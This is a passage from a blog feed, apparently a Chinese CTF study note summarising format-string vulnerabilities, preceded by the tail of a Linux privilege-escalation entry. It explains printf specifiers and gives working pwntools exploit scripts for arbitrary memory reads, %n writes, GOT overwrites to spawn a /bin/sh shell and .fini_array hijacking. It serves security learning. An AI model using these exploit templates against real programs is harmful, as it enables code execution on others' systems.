href="https://www.bilibili.com/video/BV1Es4y1M7ZL/?vd_source=ef1be23ebedc3f547905767af45d9f93">「红队笔记」Linux提权精讲：演示2 - 重磅大作！Linux提权大赏，20种Linux渗透测试提权演示精讲一次看完，渗透测试必修课一次彻底搞定！_哔哩哔哩_bilibili</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;前言：&quot;&gt;&lt;a href=&quot;#前言：&quot; class=&quot;headerlink&quot; title=&quot;前言：&quot;&gt;&lt;/a&gt;前言：&lt;/h1&gt;&lt;p&gt;b站学习完红队笔记linux提权视频做个总结和适当的补充&lt;/p&gt;
&lt;p&gt;视频连接放在最下面了&lt;/p&gt;
&lt;p&gt;视频里演示的提权方法可分</summary>
      
    
    
    
    <category term="ISW" scheme="http://example.com/categories/ISW/"/>
    
    <category term="Linux提权" scheme="http://example.com/categories/ISW/Linux%E6%8F%90%E6%9D%83/"/>
    
    
    <category term="提权" scheme="http://example.com/tags/%E6%8F%90%E6%9D%83/"/>
    
    <category term="Linux" scheme="http://example.com/tags/Linux/"/>
    
    <category term="经典方法" scheme="http://example.com/tags/%E7%BB%8F%E5%85%B8%E6%96%B9%E6%B3%95/"/>
    
    <category term="password" scheme="http://example.com/tags/password/"/>
    
  </entry>
  
  <entry>
    <title>格式化字符串漏洞 (Format String)</title>
    <link href="http://example.com/2026/03/19/PWN/pwn_attack/format_string/fmt_string%E6%80%BB%E7%BB%93/"/>
    <id>http://example.com/2026/03/19/PWN/pwn_attack/format_string/fmt_string%E6%80%BB%E7%BB%93/</id>
    <published>2026-03-19T02:00:00.000Z</published>
    <updated>2026-03-14T13:30:51.412Z</updated>
    
    <content type="html"><![CDATA[<h1 id="格式化字符串漏洞全面总结"><a href="#格式化字符串漏洞全面总结" class="headerlink" title="格式化字符串漏洞全面总结"></a>格式化字符串漏洞全面总结</h1><p>格式化字符串漏洞是 Pwn 中一种极其灵活、威力巨大的漏洞。它不需要栈溢出，只要开发者在使用输出函数时“偷了懒”，攻击者就能利用它实现<strong>任意内存读取</strong>和<strong>任意内存修改</strong>。 </p><h2 id="基础知识（格式化字符串）："><a href="#基础知识（格式化字符串）：" class="headerlink" title="基础知识（格式化字符串）："></a>基础知识（格式化字符串）：</h2><p>这里我们了解一下格式化字符串的格式，其基本格式如下</p><p><code>%[parameter][flags][field width][.precision][length]type</code></p><div class="table-container"><table><thead><tr><th>组成部分</th><th>符号与写法</th><th>含义与实战场景 (算法/Pwn)</th></tr></thead><tbody><tr><td><strong>parameter</strong></td><td><code>n$</code></td><td><strong>(Pwn 绝对核心)</strong> 取第 <code>n</code> 个参数。例如 <code>%6$p</code></td></tr><tr><td><strong>flags</strong></td><td><code>-</code></td><td>左对齐。默认是右对齐，算法竞赛打印矩阵常用。</td></tr><tr><td></td><td><code>+</code></td><td>强制显示正负号（正数前加 <code>+</code>）。</td></tr><tr><td></td><td><code>0</code></td><td>空位用 <code>0</code> 填充（默认用空格）。<strong>算法：</strong>打印时间 <code>09:05</code> 用 <code>%02d</code>；<strong>Pwn：</strong>用 <code>%012d</code> 快速造出特定长度的数据。</td></tr><tr><td></td><td><code>#</code></td><td>八进制前自动加 <code>0</code>，十六进制前自动加 <code>0x</code>。</td></tr><tr><td><strong>width</strong></td><td><code>数字</code></td><td>最小输出宽度。例如 <code>%5d</code>，即使数字是 1，也会输出 4 个空格 + 1 个 1。</td></tr><tr><td><strong>.precision</strong></td><td><code>.数字</code></td><td><strong>(算法高频)</strong> 浮点数保留几位小数（会自动四舍五入），如 <code>%.5f</code>。如果是给字符串用 <code>%.5s</code>，则代表最多只输出 5 个字符。</td></tr><tr><td><strong>length</strong></td><td><code>hh</code> / <code>h</code></td><td>修饰长度：<code>hh</code> 是单字节 (char)，<code>h</code> 是双字节 (short)。<strong>Pwn 中配合 <code>%n</code> 极其常用 (<code>%hhn</code>)，用于逐字节修改大地址。</strong></td></tr><tr><td></td><td><code>l</code> / <code>ll</code></td><td>修饰长度：<code>l</code> 是 long，<code>ll</code> 是 long long。</td></tr><tr><td></td><td><code>z</code></td><td>用于 <code>size_t</code> 类型数据，在 64 位下等价于无符号 64 位整型。</td></tr><tr><td><strong>type</strong></td><td><code>d</code>/<code>i</code>, <code>u</code></td><td>十进制有符号整数 / 无符号整数。</td></tr><tr><td></td><td><code>f</code>, <code>lf</code></td><td>浮点数 (<code>float</code> 用 <code>%f</code>，<code>double</code> 用 <code>%lf</code>)。</td></tr><tr><td></td><td><code>x</code>/<code>X</code>, <code>o</code></td><td>16 进制小写/大写，8 进制无符号数。</td></tr><tr><td></td><td><code>s</code>, <code>c</code></td><td>字符串，单个字符。</td></tr><tr><td></td><td><code>p</code></td><td>打印内存地址指针 (自带 0x 前缀)。<strong>Pwn</strong>用于泄露栈上地址 <code>%p</code>。</td></tr><tr><td></td><td><code>n</code></td><td>不输出字符，而是将<strong>目前为止成功打印的字符总数</strong>，写入对应的指针变量中</td></tr></tbody></table></div><h2 id="Pwn-漏洞利用核心组合"><a href="#Pwn-漏洞利用核心组合" class="headerlink" title="Pwn 漏洞利用核心组合"></a>Pwn 漏洞利用核心组合</h2><p>在 Pwn 领域，我们把上面的参数像魔法一样组合，化身为内存操控工具。</p><ul><li><p><strong>核心组合一：基础读取与参数定位 (<code>parameter</code> + <code>type</code>)</strong></p><ul><li><p><strong>例子</strong>：<code>%6$p</code></p></li><li><p><strong>实战含义</strong>：直接打印出栈上第 6 个参数的值。这让我们能够越过前面的垃圾数据，精准泄露远处的某一个地址。</p></li></ul></li><li><p><strong>核心组合二：精准控制写入长度 (<code>parameter</code> + <code>length</code> + <code>type</code>)</strong></p><ul><li><p><strong>例子</strong>：<code>%8$hhn</code></p></li><li><p><strong>实战含义</strong>：向栈上第 8 个参数所指向的地址里，仅仅写入<strong>一个单字节的数据</strong>。由于一次性用 <code>%n</code> 写几百万的大数字会导致程序崩溃或等待极长，使用 <code>%hhn</code> 逐字节写入是改写大地址的最高端打法。</p></li></ul></li><li><p><strong>核心组合三：用宽度造数据，用 %n 写内存 (<code>width</code> + <code>parameter</code> + <code>n</code>)</strong></p><ul><li><p><strong>例子</strong>：<code>%012d%6$n</code> (结合你的 <code>w_stack_addr.py</code> 笔记)</p></li><li><p><strong>执行逻辑</strong>：先执行 <code>%012d</code>，强制 <code>printf</code> 在屏幕上打印了 12 个字符。紧接着遇到 <code>%6$n</code>，<code>printf</code> 内部计数器数了一下刚才一共打印了 12 个字符，于是把数字 <code>12</code> (即十六进制的 <code>0xc</code>) 写入到了第 6 个参数指向的内存地址中。</p></li></ul></li></ul><h2 id="【泄露速查表】到底哪些格式符会“解引用”？"><a href="#【泄露速查表】到底哪些格式符会“解引用”？" class="headerlink" title="【泄露速查表】到底哪些格式符会“解引用”？"></a>【泄露速查表】到底哪些格式符会“解引用”？</h2><p>解引用的意味着它把参数当<strong>指针</strong>处理，否则意味着它只把参数当<strong>数值</strong>处理。</p><div class="table-container"><table><thead><tr><th>格式符</th><th>是否解引用</th><th>作用原理</th><th>漏洞利用用途</th></tr></thead><tbody><tr><td><strong><code>%s</code></strong></td><td><strong>是</strong></td><td>读取指针指向的字符串</td><td><strong>泄露远端内存内容（如泄露 GOT 表）</strong></td></tr><tr><td><strong><code>%n</code></strong></td><td><strong>是</strong></td><td>向指针指向的位置写入总字符数</td><td><strong>修改内存（如劫持 GOT 表、改判断标志）</strong></td></tr><tr><td><strong><code>%hn</code></strong></td><td><strong>是</strong></td><td>同 <code>%n</code>，但只写 2 字节</td><td>精确修改内存 (配合分批写入绕过崩溃)</td></tr><tr><td><strong><code>%hhn</code></strong></td><td><strong>是</strong></td><td>同 <code>%n</code>，但只写 1 字节</td><td><strong>更精确修改内存 (fmtstr_payload的底层核心)</strong></td></tr><tr><td><strong><code>%p</code></strong></td><td><strong>否</strong></td><td>原样输出指针所在的数值</td><td><strong>寻找参数偏移</strong>、泄露栈上残留地址</td></tr><tr><td><strong><code>%d</code></strong></td><td><strong>否</strong></td><td>原样输出整数</td><td>配合控制输出宽度 (<code>%012d</code>) 辅助 <code>%n</code> 写数字</td></tr><tr><td><strong><code>%x</code></strong></td><td><strong>否</strong></td><td>原样输出十六进制</td><td>同 <code>%p</code>，用于寻找参数偏移</td></tr><tr><td><strong><code>%c</code></strong></td><td><strong>否</strong></td><td>原样输出字符</td><td>也是用于控制输出宽度</td></tr></tbody></table></div><h1 id="格式化字符串漏洞："><a href="#格式化字符串漏洞：" class="headerlink" title="格式化字符串漏洞："></a>格式化字符串漏洞：</h1><p>漏洞的根源在于：<strong>程序将用户可控的输入，直接作为了格式化字符串函数的参数。</strong></p><p><strong>经典漏洞代码：</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> buf[<span class="number">100</span>];</span><br><span class="line"><span class="built_in">read</span>(<span class="number">0</span>, buf, <span class="number">100</span>);</span><br><span class="line"><span class="built_in">printf</span>(buf);  <span class="comment">// 绝对危险！开发者偷懒没有写 printf(&quot;%s&quot;, buf);</span></span><br></pre></td></tr></table></figure><p>除了 <code>printf</code>，这类函数还包括：<code>sprintf</code>, <code>fprintf</code>, <code>snprintf</code>, <code>vprintf</code> 等。只要你能控制这些函数的<strong>第一个参数</strong>（格式化字符串），就能触发该漏洞。</p><p><strong>格式化字符串的四种核心用途</strong>:</p><p>格式化字符串漏洞可以精准划分为四大实战用途：</p><h2 id="用途一：泄露栈上数据-寻找参数偏移"><a href="#用途一：泄露栈上数据-寻找参数偏移" class="headerlink" title="用途一：泄露栈上数据 / 寻找参数偏移"></a>用途一：泄露栈上数据 / 寻找参数偏移</h2><p>这是利用漏洞的第一步，通过输入特定的格式符，强迫 <code>printf</code> 打印出栈上的内容，从而找到我们输入的 payload 在栈上的第几个参数位置。</p><p><strong>方法</strong>：输入 <code>AAAA.%x.%x.%x.%x.%x.%x...</code> 或 <code>AAAA.%p.%p.%p...</code></p><p><strong>原理</strong>：<code>%x</code> 或 <code>%p</code> 会依次打印出栈上的值。当我们看到输出中出现了 <code>41414141</code> (<code>AAAA</code> 的十六进制)，数一下它是第几个打印出来的，这就是<strong>偏移量 (offset)</strong>。</p><p><strong>示例</strong>：如果输出是 <code>deadbeef.0.1.41414141.2.3</code>，<code>41414141</code> 是第 4 个被打印的，说明偏移量就是 <code>4</code>。如果你想用 %s 泄露，这里就用 %4$s</p><h2 id="用途二：读取任意地址内存"><a href="#用途二：读取任意地址内存" class="headerlink" title="用途二：读取任意地址内存"></a>用途二：读取任意地址内存</h2><p>找到偏移后，我们可以配合 <code>%s</code> 格式符，读取任意给定内存地址里的内容。常用来泄露 libc 基址或 GOT 表真实地址。</p><p><strong>方法</strong>：利用 <code>%[offset]$s</code> 格式符。</p><p><strong>实战代码</strong> (<code>read_stack_data.py</code> &amp; <code>r_every_mem.md</code>)：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 假设偏移是 6，要泄露 0x0804a020 地址内的数据</span></span><br><span class="line"><span class="comment"># 注意：为了防止 0x0804a020 中的 \x00 截断 printf，地址必须放在后面！</span></span><br><span class="line">payload = <span class="string">b&quot;%6$saaaa&quot;</span> + p32(<span class="number">0x0804a020</span>) </span><br><span class="line">io.sendline(payload)</span><br></pre></td></tr></table></figure><h2 id="用途三：改写栈上变量-写小数据"><a href="#用途三：改写栈上变量-写小数据" class="headerlink" title="用途三：改写栈上变量 / 写小数据"></a>用途三：改写栈上变量 / 写小数据</h2><p>利用 <code>%n</code> 格式符，<code>printf</code> 不仅能“读”，还能“写”。<code>%n</code> 会将<strong>目前为止成功打印的字符个数</strong>，写入到对应的指针地址中。</p><p><strong>方法</strong>：构造特定长度的打印输出配合 <code>%n</code>。</p><p><strong>实战代码</strong> (<code>w_stack_addr.py</code>)：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 假设我们要把栈上的某个地址修改为数值 16 (0x10)，偏移是 6</span></span><br><span class="line"><span class="comment"># p32 占 4 个字节，%012d 打印 12 个字符，总计 16 个字符。</span></span><br><span class="line"><span class="comment"># 然后遇到 %6$n，就会把 16 写入到 p32(c_addr) 指向的内存中。</span></span><br><span class="line">payload = p32(c_addr) + <span class="string">b&#x27;%012d&#x27;</span> + <span class="string">b&#x27;%6$n&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="用途四：覆写任意地址-劫持-GOT-表获取-Shell"><a href="#用途四：覆写任意地址-劫持-GOT-表获取-Shell" class="headerlink" title="用途四：覆写任意地址 / 劫持 GOT 表获取 Shell"></a>用途四：覆写任意地址 / 劫持 GOT 表获取 Shell</h2><p>由于一次性打印几百万个字符会导致程序崩溃，所以我们通常利用 pwntools 的大杀器 <code>fmtstr_payload</code> 或者按字节分批写入 (<code>%hhn</code>)</p><p>一般格式化字符串没办法获取shell，但是可以借助got表来<strong>改写printf为system</strong>，再输入/bin/sh即可获取shell。</p><p><strong>劫持 GOT 获取 Shell 实战</strong> (<code>fmt_getshell.md</code>)：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># 1. 计算偏移并获取需要劫持的 GOT 表地址</span></span><br><span class="line">adr_print_got = elf.got[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. 先利用 %s 泄露 printf 的真实地址，算出 libc 基址和 system 地址</span></span><br><span class="line"><span class="comment"># 假设之前测出偏移量为 6。%7$s 需要凑齐 8 字节对齐，所以加上 aaaa</span></span><br><span class="line"><span class="comment"># 这样 p64(adr_print_got) 就刚刚好落在第 7 个参数的位置</span></span><br><span class="line">payload_leak = <span class="string">b&quot;%7$saaaa&quot;</span> + p64(adr_print_got)</span><br><span class="line">io.sendline(payload_leak)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 接收 64 位下的真实地址 (通常为 6 个字节有效地址)，并解包</span></span><br><span class="line">true_adr_print = u64(io.recvuntil(<span class="string">b&#x27;aaaa&#x27;</span>)[:<span class="number">6</span>].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;[+] 泄露的 printf 真实地址:&#x27;</span>, <span class="built_in">hex</span>(true_adr_print))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 用泄露出来的真实地址减去 libc 中 printf 的静态偏移，得到 libc 基址</span></span><br><span class="line">libc_base = true_adr_print - libc.sym[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;[+] 计算出的 libc 基址:&#x27;</span>, <span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 顺藤摸瓜算出 system 函数的绝对地址</span></span><br><span class="line">adr_system = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3. 终极奥义：使用 fmtstr_payload 修改 GOT 表</span></span><br><span class="line"><span class="comment"># fmtstr_payload(偏移量, &#123;要修改的目标地址: 修改后的新内容&#125;)</span></span><br><span class="line">payload = fmtstr_payload(<span class="number">6</span>, &#123;adr_print_got: adr_system&#125;)</span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 4. 此时 printf 已经变成了 system。再次向程序输入 /bin/sh</span></span><br><span class="line"><span class="comment"># 程序执行 printf(&quot;/bin/sh&quot;) 实际上变成了 system(&quot;/bin/sh&quot;)</span></span><br><span class="line">io.sendline(<span class="string">&#x27;/bin/sh\x00&#x27;</span>) </span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong><code>fmtstr_payload</code> 生成的 Payload 到底有多长？如果程序输入限制在 50 字节以内怎么办？</strong></p><ul><li><p><strong>32位系统下</strong>：大约需要 <strong>40 ~ 50 字节</strong>。</p></li><li><p><strong>64位系统下</strong>：通常需要 <strong>80 ~ 120 字节</strong>！</p></li></ul><p>Pwntools 提供了一个黄金参数：<strong><code>write_size=&#39;short&#39;</code></strong></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 默认写法 (非常长)：</span></span><br><span class="line">payload = fmtstr_payload(<span class="number">6</span>, &#123;got: sys&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 压缩打法 (极大缩短长度)：</span></span><br><span class="line">payload = fmtstr_payload(<span class="number">6</span>, &#123;got: sys&#125;, write_size=<span class="string">&#x27;short&#x27;</span>)</span><br></pre></td></tr></table></figure><h2 id="用途五（进阶）：劫持-fini-array-实现无限循环-破除-One-Shot-限制"><a href="#用途五（进阶）：劫持-fini-array-实现无限循环-破除-One-Shot-限制" class="headerlink" title="用途五（进阶）：劫持 .fini_array 实现无限循环 (破除 One-Shot 限制)"></a>用途五（进阶）：劫持 .fini_array 实现无限循环 (破除 One-Shot 限制)</h2><p><strong>使用场景</strong>：在很多高难度题目中，程序只调用了一次 <code>printf</code>，然后就直接 <code>exit()</code> 或者 <code>return 0</code> 退出了。但是拿 Shell 往往需要<strong>两步</strong>（第一步泄露 libc，第二步劫持 GOT 表）。一次机会怎么做两件事？</p><p><strong>漏洞原理</strong>：在 Linux 的 ELF 可执行文件中，有一个叫 <strong><code>.fini_array</code></strong> 的段。这里面存放着一个函数指针数组。当 <code>main</code> 函数结束，程序准备退出时，系统会自动去遍历执行 <code>.fini_array</code> 里面存放的函数（用于清理善后工作）。</p><p><strong>黑客魔法</strong>：既然我们在唯一的一次 <code>printf</code> 中拥有任意地址写的能力，我们不仅可以泄露 libc，还可以<strong>同时利用 <code>%n</code> 把 <code>.fini_array</code> 里的指针，强行改成 <code>main</code> 函数的地址！</strong></p><p><strong>执行后果</strong>： <code>main</code> 函数结束 -&gt; 准备退出 -&gt; 查看 <code>.fini_array</code> -&gt; 发现里面写着 <code>main</code> 的地址 -&gt; <strong>再次执行 main 函数！</strong> 这样，你就硬生生地把一个“只能玩一次”的游戏，变成了一个无限死循环，想输入多少次 payload 就输入多少次</p><p><strong>Pwntools 实战写法：</strong></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 获取 main 函数的地址</span></span><br><span class="line">main_addr = elf.symbols[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line"><span class="comment"># 获取 .fini_array 的地址 (通常等价于 __do_global_dtors_aux_fini_array_entry)</span></span><br><span class="line">fini_array_addr = elf.symbols[<span class="string">&#x27;__do_global_dtors_aux_fini_array_entry&#x27;</span>] <span class="comment"># 或者直接填 .fini_array 所在的地址</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 在同一次 payload 中，既写 .fini_array 让他循环，又利用 %p 或 %s 泄露 libc</span></span><br><span class="line">payload = fmtstr_payload(offset, &#123;fini_array_addr: main_addr&#125;)</span><br></pre></td></tr></table></figure><h2 id="实战套路：栈残留盲打全流程"><a href="#实战套路：栈残留盲打全流程" class="headerlink" title="实战套路：栈残留盲打全流程"></a>实战套路：栈残留盲打全流程</h2><p>这是 AWDP/解题赛中，处理 64 位程序和 One-Shot（只能玩一次）题目的最高效杀招，直接跳过 <code>%s</code> 泄露的坑</p><p><strong>什么时候必须去栈上找残留信息来“盲打“</strong></p><ol><li><p><strong>One-Shot 限制</strong>：程序只有一次 <code>printf</code> 机会就直接退出。你必须在同一次 Payload 中完成【泄露】<strong>和</strong>【续命/攻击】，此时无法通过 <code>%s</code> 发送目标地址（因为 <code>\x00</code> 截断会破坏后面的续命 Payload）。</p></li><li><p><strong>严格的长度/字符限制</strong>：你的 Payload 容不下手动塞入带有 <code>\x00</code> 的大地址去泄露。</p></li></ol><h3 id="第一阶段：通过-GDB算偏移"><a href="#第一阶段：通过-GDB算偏移" class="headerlink" title="第一阶段：通过 GDB算偏移"></a>第一阶段：通过 GDB算偏移</h3><p><strong>目标</strong>：在栈底寻找 <code>__libc_start_main_ret</code> (或相关启动函数) 的地址，并算出 <code>%n$p</code> 偏移。</p><ol><li><p>在 Pwntools 里加上 <code>gdb.attach(io)</code> 启动程序。</p></li><li><p>程序停在 <code>printf</code> 前，在 gdb 终端输入 <strong><code>stack 50</code></strong>。</p></li><li><p>往下翻，盯住 <code>0x7f...</code> 开头的地址，寻找带有 <code>__libc_start_main</code> 或 <code>__libc_start_call_main</code> 标识的行。</p><ul><li>示例：<code>27:0138│+008 0x7fffffffd6f8 —▸ 0x7ffff7c29d90 (__libc_start_call_main+128)</code></li></ul></li><li><p><strong>计算偏移公式</strong>：拿最左边的十六进制序号转成十进制，加上寄存器偏移(例如这里偏移是6)</p><ul><li>示例：<code>0x27</code> = <code>39</code>，<code>39 + 6 = 45</code>。所以目标偏移是 <code>%45$p</code>。</li></ul></li></ol><h3 id="第二阶段：算出基址后干什么"><a href="#第二阶段：算出基址后干什么" class="headerlink" title="第二阶段：算出基址后干什么"></a>第二阶段：算出基址后干什么</h3><ol><li><p>拿到 <code>%45$p</code> 吐出来的残留地址（如 <code>0x7ffff7c29d90</code>）后，减去它在本地 libc 里的静态偏移，得到 <strong><code>libc_base</code> (Libc基址)</strong>。</p></li><li><p>有了基址，直接算出 <strong><code>system_addr = libc_base + libc.sym[&#39;system&#39;]</code></strong>。</p></li><li><p>发动<strong>第二回合</strong>：利用 <code>fmtstr_payload</code>，将 <code>puts</code> 或 <code>printf</code> 的 GOT 表，直接覆盖为 <code>system_addr</code>。</p></li></ol><h3 id="一波流打法模板"><a href="#一波流打法模板" class="headerlink" title="一波流打法模板"></a>一波流打法模板</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># ==================== 环境配置 ====================</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./fmtstr_level2&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.31.so&#x27;</span>)  <span class="comment"># 实战中换成题目提供的 libc</span></span><br><span class="line">io = process(<span class="string">&#x27;./fmtstr_level2&#x27;</span>)</span><br><span class="line">base_offset = <span class="number">6</span> <span class="comment"># 测出的格式化字符串起点的物理偏移</span></span><br><span class="line">fini_array = <span class="number">0x4031F0</span> <span class="comment"># 也可以用 elf.sym[&#x27;__do_global_dtors_aux_fini_array_entry&#x27;]</span></span><br><span class="line">main_addr = elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line"><span class="comment"># ==================== 回合一：泄露 + 强行续命 ====================</span></span><br><span class="line"><span class="comment"># 1. 假设我们在 gdb 中算出 libc 残留地址在第 46 个参数坑位</span></span><br><span class="line"><span class="comment"># 2. 我们用 %46$paaa 来凑齐 8 个字节 (占 1 个坑位)</span></span><br><span class="line"><span class="comment"># 3. 因为多占了 1 个坑位，后边 fmtstr_payload 的物理起点从 6 顺延变成 7</span></span><br><span class="line"><span class="comment"># 4. %p 输出 &quot;0x7f...&quot; 约 14 个字符，加上 &quot;aaa&quot; 是 17 个字符 (0x11)，所以 numbwritten=0x11</span></span><br><span class="line">payload1 = <span class="string">b&quot;%45$paaa&quot;</span> + fmtstr_payload(<span class="number">7</span>, &#123;fini_array: main_addr&#125;, numbwritten=<span class="number">0x11</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b&quot;ID\n&quot;</span>, payload1) <span class="comment"># 根据题目的提示符修改 &quot;ID\n&quot;</span></span><br><span class="line"><span class="comment"># ==================== 基址计算 ====================</span></span><br><span class="line">io.recvuntil(<span class="string">b&quot;0x&quot;</span>)</span><br><span class="line"><span class="comment"># 接收紧随 &quot;0x&quot; 之后的 12 个十六进制字符，并转成整数</span></span><br><span class="line">leaked_libc_addr = <span class="built_in">int</span>(io.recv(<span class="number">12</span>), <span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+] 泄露的残留地址:&quot;</span>, <span class="built_in">hex</span>(leaked_libc_addr))</span><br><span class="line"><span class="comment"># 减去该函数在 libc 里的相对偏移 (如果报错可用 gdb 看具体的偏移常数)</span></span><br><span class="line">libc_base = leaked_libc_addr - (libc.sym[<span class="string">&#x27;__libc_start_main&#x27;</span>] + <span class="number">128</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+] 计算出的 libc_base:&quot;</span>, <span class="built_in">hex</span>(libc_base))</span><br><span class="line"><span class="comment"># 顺藤摸瓜找到 system</span></span><br><span class="line">system_addr = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"><span class="comment"># ==================== 回合二：大杀器劫持 GOT ====================</span></span><br><span class="line"><span class="comment"># 程序因为 fini_array 被改，重新回到了 main 函数，此时我们有了一次新机会</span></span><br><span class="line"><span class="comment"># 这次我们直接改 puts 或者 printf 的 GOT 表为 system 的地址</span></span><br><span class="line">payload2 = fmtstr_payload(<span class="number">6</span>, &#123;elf.got[<span class="string">&#x27;puts&#x27;</span>]: system_addr&#125;)</span><br><span class="line">io.sendlineafter(<span class="string">b&quot;ID\n&quot;</span>, payload2)</span><br><span class="line"><span class="comment"># ==================== 终结比赛 ====================</span></span><br><span class="line"><span class="comment"># 程序接下来如果执行 puts(&quot;/bin/sh&quot;) 或者你的输入，就会执行 system</span></span><br><span class="line">io.sendline(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h1 id="实战避坑指南"><a href="#实战避坑指南" class="headerlink" title="实战避坑指南"></a>实战避坑指南</h1><h2 id="架构差异传参坑-x86-vs-x64"><a href="#架构差异传参坑-x86-vs-x64" class="headerlink" title="架构差异传参坑 (x86 vs x64)"></a>架构差异传参坑 (x86 vs x64)</h2><ul><li><p><strong>x86 (32位)</strong>：参数全部通过栈传递。用 <code>fmtarg</code> 工具或 <code>%x</code> 可以很直观地看到 payload 直接落在栈上。</p></li><li><p><strong>x64 (64位) ：注意</strong>：前 6 个参数是通过寄存器传递的（<code>rdi</code> 放了格式化字符串本身，接下来 5 个参数是 <code>RSI, RDX, RCX, R8, R9</code>）。这意味着，<strong>你的 payload 在 x64 下，偏移量至少是 6 起步</strong>（因为前 5 个坑位被寄存器占了）。</p></li></ul><h2 id="x00-截断坑-0字节陷阱"><a href="#x00-截断坑-0字节陷阱" class="headerlink" title="\x00 截断坑 (0字节陷阱)"></a><code>\x00</code> 截断坑 (0字节陷阱)</h2><p>这是初学者最容易死的地方：<code>printf</code> 处理字符串时，只要遇到 <code>\x00</code> 就会认为字符串结束，直接停止解析</p><ul><li><p><strong>64 位下</strong>：<code>payload = p64(0x401234) + b&quot;%6$s&quot;</code>。因为 <code>0x401234</code> 存为 64 位时是 <code>\x34\x12\x40\x00\x00\x00\x00\x00</code>，<code>printf</code> 读到第四个字节 <code>\x00</code> 就停了，后面的 <code>%6$s</code> 根本不会执行</p></li><li><p><strong>正确写法</strong>：必须把包含大量 <code>\x00</code> 的内存地址放在 payload 的<strong>最后面</strong>，把格式化符号放前面</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">b&quot;%7$saaaa&quot;</span> + p64(<span class="number">0x401234</span>) <span class="comment"># 用 aaaa 对齐 8 字节，地址放最后</span></span><br></pre></td></tr></table></figure></li></ul>]]></content>
    
    
      
      
